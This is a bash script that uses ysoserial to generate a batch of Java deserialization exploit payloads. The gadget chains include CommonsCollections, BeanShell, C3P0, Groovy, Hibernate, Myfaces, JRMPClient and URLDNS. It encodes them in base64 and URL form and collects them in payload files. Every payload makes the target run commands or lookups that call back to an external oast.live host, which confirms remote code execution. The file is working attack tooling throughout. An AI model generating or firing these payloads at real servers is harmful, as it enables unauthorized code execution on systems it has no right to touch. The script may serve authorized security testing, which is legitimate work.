#!/bin/bash

#AspectJWeaver
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 'nslookup d1btpt8ckt0eb3qmeaqgogmozxhps7mh5.oast.live' > tmp_payload.ser
base64 -i tmp_payload.ser | tr -d '\n' > tmp_payload.b64
PAYLOAD=$(cat tmp_payload.b64)
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar AspectJWeaver "evil.txt;$PAYLOAD" > final_payload.ser
base64 -i final_payload.ser | tr -d '\n' > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt

rm tmp_payload.ser
rm tmp_payload.b64
rm final_payload.ser
rm final_payload.b64

#BeanShell1
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar BeanShell1 'nslookup d1btpt8ckt0eb3qmeaqgogmozxhps7mh5.oast.live' | base64 > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
echo "" >> ysoserial_b64_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt
rm final_payload.b64

#C3P0
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar C3P0 'ldap://d1btpt8ckt0eb3qmeaqgogmozxhps7mh5.oast.live/a:foo' 2>/dev/null | base64 > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt
rm final_payload.b64

#Clojure
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar Clojure 'nslookup d1btpt8ckt0eb3qmeaqgogmozxhps7mh5.oast.live' | base64 > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt
rm final_payload.b64

#CommonsCollections1
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 'nslookup d1btpt8ckt0eb3qmeaqgogmozxhps7mh5.oast.live' | base64 > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt
rm final_payload.b64

#CommonsCollections5
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 'nslookup d1btpt8ckt0eb3qmeaqgogmozxhps7mh5.oast.live' | base64 > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt
rm final_payload.b64

#CommonsCollections6
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 'nslookup d1btpt8ckt0eb3qmeaqgogmozxhps7mh5.oast.live' | base64 > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt
rm final_payload.b64

#CommonsCollections7
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 'nslookup d1btpt8ckt0eb3qmeaqgogmozxhps7mh5.oast.live' | base64 > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt
rm final_payload.b64

#Groovy1
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar Groovy1 'nslookup d1btpt8ckt0eb3qmeaqgogmozxhps7mh5.oast.live'  2>/dev/null | base64 > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt
rm final_payload.b64

#Hibernate2
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar Hibernate2 'nslookup d1btpt8ckt0eb3qmeaqgogmozxhps7mh5.oast.live' | base64 > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt
rm final_payload.b64

#JRMPClient
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient 'nslookup d1btpt8ckt0eb3qmeaqgogmozxhps7mh5.oast.live'   | base64 > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt
rm final_payload.b64

#Myfaces1
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar Myfaces1 'nslookup d1btpt8ckt0eb3qmeaqgogmozxhps7mh5.oast.live'   | base64 > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt
rm final_payload.b64

#Myfaces2
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar Myfaces2 'http://d1btpt8ckt0eb3qmeaqgogmozxhps7mh5.oast.live'   | base64 > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt
rm final_payload.b64

#URLDNS
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://d1btpt8ckt0eb3qmeaqgogmozxhps7mh5.oast.live | base64 | base64 > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt
rm final_payload.b64
